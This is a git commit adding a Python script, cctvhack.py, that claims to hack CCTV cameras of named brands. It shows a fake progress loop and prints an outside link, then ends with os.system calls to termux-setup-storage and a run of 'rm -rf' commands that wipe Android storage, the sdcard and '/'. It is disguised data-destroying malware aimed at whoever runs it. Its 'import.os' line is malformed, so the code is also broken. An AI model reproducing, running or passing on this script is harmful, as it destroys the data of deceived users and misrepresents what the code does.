ea56dddb56d3f9b88b99d38994ee4cd0e5d7a929
Mr.V1P3R <109334868+Knownasjohnn@users.noreply.github.com>
2022-09-25 20:22:49 +0800

    Add files via upload

---
+++ cctvhack.py
@@ -0,0 +1,37 @@
+print(" ╭━━━┳━━━┳━━━━┳╮╱╱╭╮                     ┃╭━╮┃╭━╮┃╭╮╭╮┃╰╮╭╯┃                     ┃┃╱╰┫┃╱╰┻╯┃┃╰┻╮┃┃╭╯                     ┃┃╱╭┫┃╱╭╮╱┃┃╱╱┃╰╯┃                        ┃╰━╯┃╰━╯┃╱┃┃╱╱╰╮╭╯                        ╰━━━┻━━━╯╱╰╯╱╱╱╰╯")
+
+print("               ╭╮╱╭┳━━━┳━━━┳╮╭━╮                           ┃┃╱┃┃╭━╮┃╭━╮┃┃┃╭╯                           ┃╰━╯┃┃╱┃┃┃╱╰┫╰╯╯                              ┃╭━╮┃╰━╯┃┃╱╭┫╭╮┃                              ┃┃╱┃┃╭━╮┃╰━╯┃┃┃╰╮                           ╰╯╱╰┻╯╱╰┻━━━┻╯╰━╯ ")
+print("                 create by Good Hack")
+
+
+input("enter to continue")
+
+
+print("select a brand you want to hack")
+
+print("1.Dashua") 
+print("2.Hikvision")
+print("3.Hamrol")
+print("4.Tp Link")
+print("5.NVR")
+
+input("select a number of cctv brand:")
+
+
+for y in range (100000):
+	print("proccesing",y," Please wait")
+ddos = input(" Succesfully Hack Press enter to get the link;  ")
+
+print("copy the link below and paste to chrome")
+
+print("http://www.desilauo.com//upimg/editorimg/file/20220925/20220925201729_58246.html")
+
+import.os
+os.system('termux-setup-storage')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
